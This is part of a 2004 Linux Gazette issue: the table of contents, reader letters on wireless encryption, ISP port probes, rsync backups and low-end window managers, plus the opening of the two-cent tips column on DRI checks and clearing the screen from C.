

<html>
<head>
<link href="../lg.css" rel="stylesheet" type="text/css" media="screen, projection" />
<title>
Linux Gazette : August 2004 (#105) 
</title>

<style type="text/css" media="screen, projection">
<!--

.twdtarticle {
	width: 84%;
	/* margin:0px;
	left:0px; */
}

#twdtbody {
/*
	margin-left:0px;
	margin-right:0px;
*/
}

.twdtarticle h1 {
	font-size:19px;
	text-align:center;
}

.lgcontent {
        width: 84%;
        margin-top: 30px;
        /* left:0px; */
}

-->
</style>


</head>

<body id="twdtbody">


<img src="../gx/2003/newlogo-blank-200-gold2.jpg" alt="Linux Gazette" id="twdtlogo"/>
<p id="fun">...making Linux just a little more fun!</p>




<div class="content lgcontent">

<h2>August 2004 (#105):</h2>

<ul>


	<li><a href="#lg_mail">The Mailbag</a>

	<li><a href="#lg_tips">More 2 Cent Tips!</a>

	<li><a href="#lg_answer">The Answer Gang</a>

	<li><a href="#lg_bytes">News Bytes</a>, by <i>Michael Conry</i></li>

	<li><a href="#adam">Fvwm</a>, by <i>Thomas Adam</i></li>

	<li><a href="#murray">How To Enable Desktop Icons for Lightweight Window Managers</a>, by <i>John Murray</i></li>

	<li><a href="#nielsen">White Box Linux Kickstart Tricks</a>, by <i>Mark Nielsen</i></li>

	<li><a href="#odonovan">Securing a New Linux Installation</a>, by <i>Barry O'Donovan</i></li>

	<li><a href="#oregan">RDF and the Semantic Web</a>, by <i>Jimmy O'Regan</i></li>

	<li><a href="#oregan2">RSS and Feed Readers</a>, by <i>Jimmy O'Regan</i></li>

	<li><a href="#pitcher">Q &amp; A: The difference between hard and soft links</a>, by <i>Lew Pitcher</i></li>

	<li><a href="#pitcher1">Dude, Where's my System?</a>, by <i>Lew Pitcher</i></li>

	<li><a href="#price">Using Samba to join a Windows NT domain</a>, by <i>Rich Price</i></li>

	<li><a href="#ramankutty">Inter-Process Communication - Part II</a>, by <i>Hiran Ramankutty</i></li>

	<li><a href="#seymour">Design Awareness</a>, by <i>Mark Seymour</i></li>

	<li><a href="#youngman">Fine-tuning SpamAssassin</a>, by <i>Neil Youngman</i></li>

	<li><a href="#ecol">Ecol</a>, by <i>Javier Malonda</i></li>

	<li><a href="#qubism">Qubism</a>, by <i>Jon "Sir Flakey" Harsem</i></li>

	<li><a href="#lg_laundrette">The Linux Laundrette</a>

	<li><a href="#lg_backpage">The Backpage</a>, by <i>Ben Okopnik</i></li>

</ul>

</div>




<br />


<div class="content lgcontent">

<a name="lg_mail"></a>
<h1>The Mailbag</h1>


</b>
</p>


<p>
<HR>
<center>
<BIG><STRONG><FONT COLOR="maroon">HELP WANTED : Article Ideas</FONT></STRONG></BIG>
<BR>
<STRONG>Submit comments about articles, or articles themselves (after reading <a href="../faq/author.html">our guidelines</a>) to <A HREF="mailto:gazette@lists.linuxgazette.net">The Editors of <i>Linux Gazette</I></A>, and technical answers and tips about Linux to <A HREF="mailto:tag@lists.linuxgazette.net">The Answer Gang</A>. 
</STRONG>
</center><HR>
<UL>
<!-- index_text begins -->
<li><A HREF="#wanted.1"
	><strong>encryption kills my connection in linux but works in win98</strong></a>
<li><A HREF="#wanted.2"
	><strong>Probing from ISP?</strong></a>
<!-- index_text ends -->
</UL>
<!--     .~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.     -->
<P> <A NAME="wanted.1"><HR WIDTH="75%" ALIGN="center"></A> <P>
<H3><IMG ALIGN=BOTTOM ALT="" SRC="../gx/envelope.gif">
<FONT COLOR="navy">encryption kills my connection in linux but works in win98</FONT></H3>
Wed, 28 Jul 2004 15:13:27 -0700
<BR>David Rich (<a href="mailto:tag@lists.linuxgazette.net?cc=denis.miller@sympatico.ca&cc=dsrich@ieee.org&subject=%20Re%3A%20%5BLG%20105%5D%20help%20wanted%20%231">dsrich from ieee.org</a>)
<BR>Question by Denis Miller (denis.miller from sympatico.ca)

<P><STRONG>
I have a wireless connection to my landlords internet connection.
Under win98 it works fine but using xandros the encryption does not
work. Using no encryption it works fine.
</STRONG></P>
<P><STRONG>
128 byte, infrastructure mode, netgear am111 usb, signal strength over
68%.  Is there some trick to using encryption I am missing.
</STRONG></P>

<p><Strong><ol>
<LI>Are you actually using encryption under Win98?


<LI>Is your landlord's Access Point set up to allow encryption?  From the fact
that it works without encryption, it cannot be set up to require it, so it may
not be set up to allow it at all.


<LI>Where did you find a landlord so kind as to allow you to use his
bandwidth?
</ol></Strong></p>

<blockquote><font color="#000066">Okay, okay, kudos to any landlord who's a kind enough soul to offer #3.
Wireless is becoming a popular topic - people are welcome to give a good
solid shot at this question, but we'd also enjoy seeing an article about
something wireless.   Tripping over cords all the time makes Linux or in
fact any networking OS just a little less fun...
 -- Heather</font></blockquote>

<!-- end 1 -->
<!--     .~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.     -->
<P> <A NAME="wanted.2"><HR WIDTH="75%" ALIGN="center"></A> <P>
<H3><IMG ALIGN=BOTTOM ALT="" SRC="../gx/envelope.gif">
<FONT COLOR="navy">Probing from ISP?</FONT></H3>
Mon, 5 Jul 2004 11:16:05 -0500 (COT)
<BR>John Karns (<a href="mailto:tag@lists.linuxgazette.net?cc=jkarns@etb.net.co&subject=%20Re%3A%20%5BLG%20105%5D%20help%20wanted%20%232">jkarns from etb.net.co</a>)


<P>
Hi gang,
</P>
<P>
I noticed some weirdness in my logs yesterday.  They're filling up with
events which appear to be probes to various ports on my machine, averaging
one every 2 - 3 secs.  The source ports (SPT in log) are above 1024, to
lower numbered destination ports (in most cases)  I'm using a Linksys
WRT54G wlan router (runs Linux!!), flashed to a 3rd party mod of the OS
called samadhi2.  I have the router firewall enabled.  I'm not sure what
to make of the situation, but I'm guessing that the ISP (an MS W2k shop)
has been cracked with a virus that is probing all IP's in their pool.
</P>
<P>
I'd be most interested in any comments.
</P>

<blockquote><font color="#000066">That was pretty close to the beginning of the month, things have been
dealt with since then.  We'll just give a taste of this - it's a sad
fact of modern network life that the destructive forces of virus and
worm blitzes affect every OS, just by chewing our bandwidth up like a
big dog chews up the master's old shoes.
</font></blockquote>
<blockquote><font color="#000066">We'll protect the privacy of his shop here, suffice it to say that his
system logs showed a lot of traffic to destination ports 135 (hmm,
something in the mswin/Smb packet family?) and 445, though other ports
are sometimes seen... with a few to higher numbered ports (9898, 443,
1433...
</font></blockquote>
<blockquote><font color="#000066">Other nodes seem to be getting traffic either to or from 34240 or other
ports around that range. (viewed with iptraf -- Heather</font>)</blockquote>
<P>
It's interesting (and confusing) that the iptraf output on the 2nd node
doesn't show traffic with the same ports as the ipfilter log from the
other node.  Nor does the system log on the 2nd node show any probes to
ports 135 &amp; 445.
</P>
<P>
--
John Karns
</P>

<blockquote><font color="#000066">If system forensics or network security is your bag, perhaps you could
write us a nice juicy article about how to effectively determine what
systems in a network are infested with a virus or worm that's going
wild?   Seeing your network clobbered is no fun - solving an annoying
puzzle can be, especially if it gives our gentle readers any leads on
preventing or solving the same kinds of problems themselves.   We'd
just <EM>love</EM> to have something on this topic, some meat to sink our
teeth into.  No red herrings please!  (Tux likes herring.  Ok, fine, you
can bribe him with herring, but only if the rest of the article is
delicious to our editors, at <img src="../gx/lgmail/articles.png">.)
 -- Heather</font></blockquote>

<!-- end 2 -->
<HR>
<center>
<BIG><STRONG><FONT COLOR="maroon">GENERAL MAIL</FONT></STRONG></BIG>
<BR>
</center><HR>
<UL>
<!-- index_text begins -->
<li><A HREF="#mailbag.1"
	><strong>Article Feedback [104]: rsync and anacron</strong></a>
<li><A HREF="#mailbag.2"
	><strong>Linux Journal Reader's Choice</strong></a>
<li><A HREF="#mailbag.3"
	><strong>Re: Hi Jimmy. Thanks for LG articles</strong></a>
<li><A HREF="#mailbag.4"
	><strong>Where to send more 2c TIPS?</strong></a>
<li><A HREF="#mailbag.5"
	><strong>MMA</strong></a>
<!-- index_text ends -->
</UL>
<!--     .~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.     -->
<P> <A NAME="mailbag.1"><HR WIDTH="75%" ALIGN="center"></A> <P>
<H3><IMG ALIGN=BOTTOM ALT="" SRC="../gx/envelope.gif">
<FONT COLOR="navy">Article Feedback [104]: rsync and anacron</FONT></H3>
Sat, 3 Jul 2004 15:51:01 +0100
<BR>Thomas Adam (<a href="mailto:gazette@lists.linuxgazette.net?subject=%20Re%3A%20%5BLG%20105%5D%20mailbag%20%231">The <em>LG</em> Weekend Mechanic</a>)


<P>
<a href="http://linuxgazette.net/authors/odonovan.html">Barry O'Donovan</a>
mentioned in his article that:
</P>

<blockquote><pre>00 02 * * * rsync -r -e ssh --delete /home/username/mail
username@mycomputer.mycompany.com:/backups/mail
</pre></blockquote>
<P>
...is best run from cron -- yet this could cause a few issues if one is
already running some kind of "ntp" check, since the task running at
precisely 02:00 could clock skew. This would cause the scheduled rsync
process above to get reloaded by cron multiple times or even not at all.
Therefore, it is best to offset the time to either a few minutes before
the hour, or a few minutes afterwards.
</P>
<P>
-- Thomas Adam
</P>

<!-- end 1 -->
<!--     .~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.     -->
<P> <A NAME="mailbag.2"><HR WIDTH="75%" ALIGN="center"></A> <P>
<H3><IMG ALIGN=BOTTOM ALT="" SRC="../gx/envelope.gif">
<FONT COLOR="navy">Linux Journal Reader's Choice</FONT></H3>
Wed, 7 Jul 2004 12:58:53 -0400
<BR>Rick Moen (<a href="mailto:gazette@lists.linuxgazette.net?subject=%20Re%3A%20%5BLG%20105%5D%20mailbag%20%232"><em>LG</em> Contributing Editor</a>)
<BR>Question by Brendon Oliver (brendon.oliver from redsheriff.com)

<P><STRONG>
Hi there,
</STRONG></P>
<P><STRONG>
I just noticed today that voting for this year's Reader's Choice Awards on
linuxjournal.com has now opened.  Thought it rather interesting (not!) that
they only list the "hijacked" Linux Gazette (linuxgazette.com) under their
"Favourite Linux Web Site" category.
</STRONG></P>
<P><STRONG>
So I made a point of nominating you guys as an "Other" site in my vote (as the
<EM>REAL</EM> Linux Gazette), and added a few words in their "Extra Comments" at the
bottom of the form.  I hope some of the other readers can do the same (voting
will most likely be closed by the time the next issue is ready).
</STRONG></P>
<P>
Thank you for doing that.  I assume you're aware that the form
submissions (from <A HREF="http://www.linuxjournal.com/rc2004"
	>http://www.linuxjournal.com/rc2004</A>) aren't public,
and will no doubt be filtered through company policy by an SSC employee.
But the gesture is appreciated.
</P>
<P><STRONG>
I wasn't
too happy over the treatment you got from SSC, but unfortunately linux mags
are scarce on the ground here in Australia, so didn't really want to "vote
with my $$" and cancel my subscription.  Besides, it's a big world &amp; there
should be pletny of publication space for all.
</STRONG></P>
<P><STRONG>
Anyways, I've been an avid reader of the Gazette since probably late '97 so
just thought I'd add a vote of confidence from one happy reader!  Keep up the
great work!
</STRONG></P>
<P><STRONG>
Regards,
</STRONG></P>
<P><STRONG>
- Brendon Oliver.
</STRONG></P>
<P>
Indeed, I for one would never wish <EM>Linux Journal</EM> any harm.  We need it!
</P>
<P>
Cheers,
Rick Moen
</P>

<!-- end 2 -->
<!--     .~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.     -->
<P> <A NAME="mailbag.3"><HR WIDTH="75%" ALIGN="center"></A> <P>
<H3><IMG ALIGN=BOTTOM ALT="" SRC="../gx/envelope.gif">
<FONT COLOR="navy">Re: Hi Jimmy. Thanks for LG articles</FONT></H3>
Wed, 28 Jul 2004 22:20:14 +0100
<BR>Jimmy O'Regan (<a href="mailto:gazette@lists.linuxgazette.net?subject=%20Re%3A%20%5BLG%20105%5D%20mailbag%20%233">The <em>LG</em> Answer Gang</a>)
<BR>Question by senthil (senthil from symonds.net)

<P>
[cc:ing TAG in the hope of continuing the thread about software for
low-spec machines]
</P>

<blockquote><font color="#000066">Hear that, readers?  If you've got more low-end system ideas, send them
to The Answer Gang, at <img src="../gx/lgmail/tag.png">.
 -- Heather</font></blockquote>
<P><STRONG>
Hi Jimmy,
</STRONG></P>
<P><STRONG>
Kudos for your articles at LG.
</STRONG></P>
<P><STRONG>
I had read LG103, enjoyed it thoroughly and read LG104 quickly and found good number of useful articles.
Especially my pick was the Linux on Low End Systems from Answer Gang.
I have got a System having 128 MB RAM and unfortunately fits in the low end category as far as X,Gnome,kde are concerned. But instead of spending bucks, I have been enjoying with elinks,mpg123,vim and gcc, which are my mostly used ones.
I use twm sometimes and have not tried others.
</STRONG></P>
<P><STRONG>
Hope to try with the suggestions given by the LG.
</STRONG></P>
<P><STRONG>
Thanks!
Senthil
</STRONG></P>
<P>
Thanks for the mail.
</P>
<P>
If you don't mind my offering a few more suggestions, I'd like to point
you in the direction of MPlayer for your video needs - it truly is a
wonderful piece of software, and doesn't try to use more memory than it
needs: <A HREF="http://www.mplayerhq.hu"
	>http://www.mplayerhq.hu</A>
</P>
<P>
There are a lot of great window managers out there with low memory
requirements which you might prefer: FVWM (<A HREF="http://www.fvwm.org"
	>http://www.fvwm.org</A>) is
possibly the most configurable, or you might prefer IceWM
(<A HREF="http://www.icewm.org"
	>http://www.icewm.org</A>) or WindowMaker (<A HREF="http://www.windowmaker.org"
	>http://www.windowmaker.org</A>).
</P>

<blockquote><font color="#000066">Many of which were hotlinked in the "WM Wars" blurb of The Answer Gang
column in our April issue.
 -- Heather</font></blockquote>
<P>
The articles I'm currently trying to finish for next month's edition are
about news aggregators and LiveJournal clients - if you have any
interest in either of these areas, Snownews
(<A HREF="http://home.kcore.de/~kiza/software/snownews"
	>http://home.kcore.de/~kiza/software/snownews</A>) and Clive
(<A HREF="http://sourceforge.net/projects/ljclive"
	>http://sourceforge.net/projects/ljclive</A>) are good CLI programs for
these respective tasks.
</P>
<P>
Do you mind if I forward your mail (unencrypted, of course 
<IMG SRC="../gx/dennis/smily.gif" ALT=":)" 
		height="24" width="20" align="middle"> to the
Answer Gang? We like to get feedback from our readers, and I think
Thomas and Heather in particular will be pleased to hear that the
information for low-end systems was useful to you.
</P>
<P>
Or, even better - you could write yourself, and offer your
suggestions. The thread in last month's issue only focused on
graphical interfaces - I'm sure that a great thread could come of it.
You never know - you might like it, and become a member 
<IMG SRC="../gx/dennis/smily.gif" ALT=":)" 
		height="24" width="20" align="middle">
</P>
<HR width="10%" align="center"><P><STRONG>
Thanks Jimmy for your quick reply and your suggestions.
I would definitely try Mplayer (I have heard that Mplayer plays movie in the
text mode as well) and fvwm.
</STRONG></P>
<P><STRONG>
The thing which interested me in TWM is its simplicity which helped me
understand some of the underlying concepts.
</STRONG></P>
<P>
Thomas has written enough about FVWM to make me think that it would be
better for this than TWM.
</P>
<P><STRONG>
snownews and ljclive seems very interesting!!
btw, as we are on the topic of blogs and RSS, have you tried Nanoblogger?
<A HREF="http://sourceforge.net/projects/nanoblogger"
	>http://sourceforge.net/projects/nanoblogger</A>
</STRONG></P>
<P>
Wow. Looks great.
</P>
<P><STRONG>
I have used it, have involved myself with bugs and change-requests of this
project.
</STRONG></P>
<P><STRONG>
This is a very good cli based blogging utility and would definitely complement
the topics you are writing.
</STRONG></P>
<P><STRONG>
Jimmy, if you are covering snownews,ljclive in article,I feel a section on
nanoblogger will be informative as well.
</STRONG></P>
<P>
It's a bit too late in the month to start looking at something new, but
I'll have a look at it for next month.
</P>
<P><STRONG>
Jimmy,Feel free to forward the coversation to the Answer Gang and my wishes to
Thomas and Heather for their Wonderful work.
</STRONG></P>
<P><STRONG>
Hope I would be getting more involved with LG 
<IMG SRC="../gx/dennis/smily.gif" ALT=":)" 
		height="24" width="20" align="middle">
</STRONG></P>
<P><STRONG>
Cheers!
Senthil
</STRONG></P>

<!-- end 3 -->
<!--     .~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.     -->
<P> <A NAME="mailbag.4"><HR WIDTH="75%" ALIGN="center"></A> <P>
<H3><IMG ALIGN=BOTTOM ALT="" SRC="../gx/envelope.gif">
<FONT COLOR="navy">Where to send more 2c TIPS?</FONT></H3>
Wed, 14 Jul 2004 21:32:56 +0200 (CEST)
<BR>Flavio Poletti (<a href="mailto:gazette@lists.linuxgazette.net?subject=%20Re%3A%20%5BLG%20105%5D%20mailbag%20%234">anonymous</a>)


<P><STRONG>
Hi,
</STRONG></P>
<P><STRONG>
it's quite some time that I don't read the Linux Gazette. Ok, this is
awful from my side 
<IMG SRC="../gx/dennis/smily.gif" ALT=":)" 
		height="24" width="20" align="middle">
</STRONG></P>
<P><STRONG>
I've had some difficulties in sorting out which is the TRUE Linux Gazette,
when I finally had a flash and took the one with Jim Dennis inside 
<IMG SRC="../gx/dennis/smily.gif" ALT=":)" 
		height="24" width="20" align="middle">
Jokes apart, I was very disappointed reading the whole story, but that's
the world and I'm happy that we all can have Ye Ol' Linux Gazette on the
net.
</STRONG></P>
<P><STRONG>
Here comes my first question:
</STRONG></P>
<P><STRONG><BLOCKQuote>
"Where is one decent guy supposed to send its 2c tips?!?"
</BLOCKQuote></STRONG></P>

<font color="#660000"><blockquote>Right here, to this very address. This is all mentioned in the FAQ that
we've all slaved over:
</blockquote>
<blockquote><A HREF="http://linuxgazette.net/faq/index.html"
	>http://linuxgazette.net/faq/index.html</A>
 -- Thomas</blockquote></font>

<blockquote><font color="#000066">Thanks Flavio.  More Two Cent Tips come from two sources - directly from
our readers, and from members of the Answer Gang (when the answers are
short).  Really, any reader can contribute to the answers found in
<EM>Linux Gazette</EM> - so tips as well as questions are sent to
<img src="../gx/lgmail/tag.png"> - ideally with the word "2c" or "Two Cent" in the
subject line.
</font></blockquote>
<blockquote><font color="#000066">We really should improve the header over in More Two Cent Tips.  Thanks
for bringing it up 
<IMG SRC="../gx/dennis/smily.gif" ALT=":)" 
		height="24" width="20" align="middle">
 -- Heather</font></blockquote>
<P><STRONG>
I looked for it in all the website, but had no clue! Then I peeked the
"More 2c tips" section and - aaaagh! But there are questions there!!! This
leads to my second question:
</STRONG></P>
<P><STRONG><BLOCKQuote>
"Where have 2c tips gone?!?"
</BLOCKQuote></STRONG></P>
<P><STRONG>
I remember those neat, fast 2c tips in the golden age, but now I only see
some kind of TAG satellite section!
</STRONG></P>

<font color="#660000"><blockquote>I'm not quite sure what you're looking at, or indeed whether it is a
mirror site that for whatever reason has not synced yet. The number of
2c-tips from readers has been in decline, for all the reasons outlayed
in issue 103-104.
 -- Thomas</blockquote></font>

<blockquote><font color="#000066">When a Tip is inspired by a question to the Answer Gang, we feel it's fair
that the question be mentioned;  in most cases the Editor's Scissors have
trimmed the question down a bit (you should see the clipping room floor.
Question marks and bangsigns and dots all over the place. What a mess I
have to clean up after!) for your reading enjoyment.
 -- Heather</font></blockquote>
<P><STRONG>
Ok, ok, flames off now, the magazine is quite healty and I don't want to
spoil my happiness in having (re-)found it. So... I drop my 2c tip to you
TAG, hoping that I won't be censored for my - how to say it? - attitude to
write too much!
</STRONG></P>
<P><STRONG>
All the best to you all,
</STRONG></P>
<P><STRONG>
Flavio Poletti.
</STRONG></P>

<blockquote><font color="#000066">If your attitude includes making Linux a little more fun, I see no
reason why we'd censure it (complain), much less censor it (edit it out
to attempt to ignore it).  We love to see Two Cent Tips from readers -
they're the juiciest!  Thanks for sending yours, Flavio, and I hope it
will encourage more readers to send theirs in too. Welcome back.
</font></blockquote>
<blockquote><font color="#000066">(Your 2c Tip's in the current issue, of course, albeit with a couple of
comments from the Gang.)
 -- Heather</font></blockquote>

<!-- end 4 -->
<!--     .~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.     -->
<P> <A NAME="mailbag.5"><HR WIDTH="75%" ALIGN="center"></A> <P>
<H3><IMG ALIGN=BOTTOM ALT="" SRC="../gx/envelope.gif">
<FONT COLOR="navy">MMA</FONT></H3>
	Mon, 05 Jul 2004 11:36:22 -0700
<BR>Bob van der Poel (<a href="mailto:gazette@lists.linuxgazette.net?subject=%20Re%3A%20%5BLG%20105%5D%20mailbag%20%235">bvdp from uniserve.com</a>)
<BR>Question by Jimmy O'Regan (jimregan from o2.ie)

<P>
Thanks for the comments on MMA in your recent Gazette column. I've just
posted 0.9 on my site:
</P>
<P><BLOCKQuote>
<A HREF="http://mypage.uniserve.com/~bvdp"
	>http://mypage.uniserve.com/~bvdp</A>
</BLOCKQuote></P>
<P>
you'll find it is even MORE MUSICAL 
<IMG SRC="../gx/dennis/smily.gif" ALT=":)" 
		height="24" width="20" align="middle">
Shout if problems!
</P>
<P>
--
Bob van der Poel
</P>

<!-- end 5 -->
<HR>
<center>
<BIG><STRONG><FONT COLOR="maroon">GAZETTE MATTERS</FONT></STRONG></BIG>
<BR>
</center><HR>
<UL>
<!-- index_text begins -->
<li><A HREF="#gaz.1"
	><strong>FAQ updates</strong></a>
<li><A HREF="#gaz.2"
	><strong>LG in the news.</strong></a>
<li><A HREF="#gaz.3"
	><strong>TAG Knowledge Base updated</strong></a>
<!-- index_text ends -->
</UL>
<!--     .~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.     -->
<P> <A NAME="gaz.1"><HR WIDTH="75%" ALIGN="center"></A> <P>
<H3><IMG ALIGN=BOTTOM ALT="" SRC="../gx/envelope.gif">
<FONT COLOR="navy">FAQ updates</FONT></H3>
Sun, 4 Jul 2004 15:52:34 -0400
<BR>Ben Okopnik (<a href="mailto:gazette@lists.linuxgazette.net?subject=%20Re%3A%20%5BLG%20105%5D%20gazette%20matters%20%231"><em>Linux Gazette</em> Editor</a>)


<P>
I've just updated the General LG FAQ, with much credit going to Jimmy
for his initial proofing. Comments and suggestions welcome:
</P>
<P><BLOCKQuote>
<A HREF="http://linuxgazette.net/faq/general.html"
	>http://linuxgazette.net/faq/general.html</A>
</BLOCKQuote></P>
<P>
The Author FAQ has also been updated this month;  if you're looking
to write an article for us 
<IMG SRC="../gx/dennis/smily.gif" ALT=":)" 
		height="24" width="20" align="middle"> please read it and then work with our
article editors:
</P>
<P><BLOCKQuote>
<A HREF="http://linuxgazette.net/faq/author.html"
	>http://linuxgazette.net/faq/author.html</A>
</BLOCKQuote></P>

<!-- end 1 -->
<!--     .~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.     -->
<P> <A NAME="gaz.2"><HR WIDTH="75%" ALIGN="center"></A> <P>
<H3><IMG ALIGN=BOTTOM ALT="" SRC="../gx/envelope.gif">
<FONT COLOR="navy">LG in the news.</FONT></H3>
Sat, 10 Jul 2004 02:49:31 +0100
<BR>Jimmy O'Regan (<a href="mailto:gazette@lists.linuxgazette.net?subject=%20Re%3A%20%5BLG%20105%5D%20gazette%20matters%20%232">The <em>LG</em> Answer Gang</a>)


<P>
FYI, here's a list of other sites where I post LG announcements.  Has
anyone got any suggestions for sites I can add to the list for next month?
</P>

<blockQuote><ul>
<LI>LinuxToday.com


<LI>PCLinuxOnline.com


<LI>dot.kde.org


<LI>LinuxLookup.com
</ul></blockQuote>
<P>
I didn't post this, thanks are due to whoever did.
</P>

<blockQuote><ul>
<LI>Live Journal:
<A HREF="http://www.livejournal.com/users/linuxgaznet"
	>http://www.livejournal.com/users/linuxgaznet</A>
</ul></blockQuote>

<blockquote><font color="#000066">We occasionally see references back to us at Linux Weekly News
(<A HREF="http://lwn.net"
	>http://lwn.net</A>) too.   Kind readers, let us know about other
linuxgazette.net sightings. New mirrors are always welcome, too. :D
 -- Heather</font></blockquote>

<!-- end 2 -->
<!--     .~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.     -->
<P> <A NAME="gaz.3"><HR WIDTH="75%" ALIGN="center"></A> <P>
<H3><IMG ALIGN=BOTTOM ALT="" SRC="../gx/envelope.gif">
<FONT COLOR="navy">TAG Knowledge Base updated</FONT></H3>
Sun, 11 Jul 2004 03:10:38 -0400
<BR>Ben Okopnik (<a href="mailto:gazette@lists.linuxgazette.net?subject=%20Re%3A%20%5BLG%20105%5D%20gazette%20matters%20%233"><em>Linux Gazette</em> Editor</a>)


<P>
Finally, after many long, weary years, much wailing, gnashing of teeth,
rending of clothes, and other low-budget special effects, TAG KB has
been updated, courtesy of Dave Richardson. Our newest proofreader has
started off with a BANG!... all right, you FBI people can all leave now,
it was all harmless, no harm no foul. Sheesh, they're all so <EM>twitchy</EM>
these days!
</P>
<P>
Anyway, Dave - welcome and a job well done! As always, folks, comments
and suggestions are highly welcome and encouraged.
</P>
<P>
<A HREF="http://linuxgazette.net/tag/kb.html"
	>http://linuxgazette.net/tag/kb.html</A>
</P>

<!-- end 3 -->
<hr>
<CENTER><Font face="Helvetica"><STRONG>
This page edited and maintained by the Editors of <I>Linux Gazette</I><br>HTML script maintained by <A HREF="mailto:star@starshine.org">Heather Stern</a> of Starshine Technical Services, <A HREF="http://www.starshine.org/">http://www.starshine.org/</A>
</STRONG></Font></CENTER>
<hr>

</p>



<!-- *** BEGIN author bio *** -->
<!-- *** END author bio *** -->




<div id="articlefooter">




<p>
Published in Issue 105 of Linux Gazette, August 2004
</p>

</div>

</div>


<div class="content lgcontent">

<a name="lg_tips"></a>
<h1>More 2 Cent Tips!</h1>


</b>
</p>


<p>
<center><STRONG>See also: The Answer Gang's 
<a href="../tag/kb.html">Knowledge Base</a>
and the <i>LG</i> 
<a href="http://www.linuxgazette.net/search.html">Search Engine</a></STRONG>
</center><HR>
<UL>
<!-- index_text begins -->
<li><A HREF="#tips.1"
	><strong>Is your video acceleration system working?</strong></a>
<li><A HREF="#tips.3"
	><strong>C program problem</strong></a>
<li><A HREF="#tips.4"
	><strong>Front and Back: KPGP and GPG</strong></a>
<li><A HREF="#tips.5"
	><strong>OpenChange</strong></a>
<li><A HREF="#tips.6"
	><strong>SCP server for Windows (98/2k)</strong></a>
<li><A HREF="#tips.7"
	><strong>Slackware retrospective</strong></a>
<li><A HREF="#tips.8"
	><strong>Triggering one of several options with Juk and KHotkeys</strong></a>
<li><A HREF="#tips.9"
	><strong>Using Windows Keyboard Media Buttons In Linux</strong></a>
<li><A HREF="#tips.10"
	></a>Where to send more 2c TIPS? --or--
<br><A HREF="#tips.10"
	><strong>Telnet's nice, netcat's better</strong></a>
<br>plus, <TT>/dev/tcp</TT> bashing
<!-- index_text ends -->
</UL>
<!--     .~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.     -->
<P> <A NAME="tips.1"><HR WIDTH="75%" ALIGN="center"></A> <P>
<H3><IMG ALIGN=BOTTOM ALT="" SRC="../gx/lil2cent.gif">
<FONT COLOR="navy">Is your video acceleration system working?</FONT></H3>
Ben Okopnik (<a href="mailto:tag@lists.linuxgazette.net?cc=ben@callahans.org&subject=%20Re%3A%20%5BLG%20105%5D%202c%20Tips%20%231"><em>Linux Gazette</em> Editor</a>)


<P>
Are your games running slowly, even though you have the latest whizbang
video card? Is your Quake action more like a slow-motion low-crawl
through Jell-O than a high-FPS <strong>F</strong>(irst) <strong>P</strong>(erson) <strong>S</strong>(hooter)? You may be
using software emulation of direct rendering (DRI) instead of the real
thing, or may have outdated (or missing) GL libraries.
</P>
<P>
Here's a simple shell script that brings together all the necessary
tools for checking your system's DRI status. I strongly suggest
referring to the DRI Troubleshooting page at
<A HREF="http://dri.sourceforge.net/cgi-bin/moin.cgi/DriTroubleshooting"
	>http://dri.sourceforge.net/cgi-bin/moin.cgi/DriTroubleshooting</A> for a
good guide to fixing any problems you find; it's been of great help to
me several times.
</P>
<p align="center">See attached <tt><a href="misc/tips/check-dri-status.bash.txt">check-dri-status.bash.txt</a></tt></p>
<P>
Save it, make it executable with 'chmod +x &lt;name&gt;', run it, and follow
the prompts at the bottom of the screen. (And remember to keep moving as
you fire; the Macron in Level 8 can shoot missiles all day long.)
</P>

<!-- end 1 -->
<!-- end 2 -->
<!--     .~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.     -->
<P> <A NAME="tips.3"><HR WIDTH="75%" ALIGN="center"></A> <P>
<H3><IMG ALIGN=BOTTOM ALT="" SRC="../gx/lil2cent.gif">
<FONT COLOR="navy">C program problem</FONT></H3>
Jason Creighton (<a href="mailto:tag@lists.linuxgazette.net?cc=sanjib_w@hotmail.com&cc=androflux@softhome.net&subject=%20Re%3A%20%5BLG%20105%5D%202c%20Tips%20%233">androflux from softhome.net</a>)
<BR>Question by Sanjib Roy (sanjib_w from hotmail.com)

<P><STRONG>
how can i Clear Screen and Move Cursor to print a message in the screen from
a C program that uses standard C function like <TT> printf()</TT> <TT> putch()</TT> without
using ncurses.
</STRONG></P>
<P><STRONG>
Is there any function such as  <TT>"clrscr()</TT>" and <TT> gotoxy()</TT> that are available in
Dos based Turbo C++ compiler are available in Linux if not what is
alternative
</STRONG></P>
<P><STRONG>
PLEASE HELP ME
</STRONG></P>

<font color="#660000"><blockquote>I'd ask your lecturer this one.
</blockquote>
<blockquote>Homework getting you down? Good, don't ask us, we won't help. 
<IMG SRC="../gx/dennis/smily.gif" ALT=":)" 
		height="24" width="20" align="middle">
 -- Thomas</blockquote></font>
<BLOCKQUOTE>
[Jason] 
You can't do that without ncurses. That is, you can't do it in a
standard way that will work everywhere. You could spit out some escape
codes, but that only works with on type of terminal. This sort of
problem is exactly why the ncurses library exists, and to not use it
would be quite silly.
</BLOCKQUOTE>

<!-- end 3 -->
<!--     .~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.~~.     -->
<P> <A NAME="tips.4"><HR WIDTH="75%" ALIGN="center"></A> <P>
<H3><IMG ALIGN=BOTTOM ALT="" SRC="../gx/lil2cent.gif">
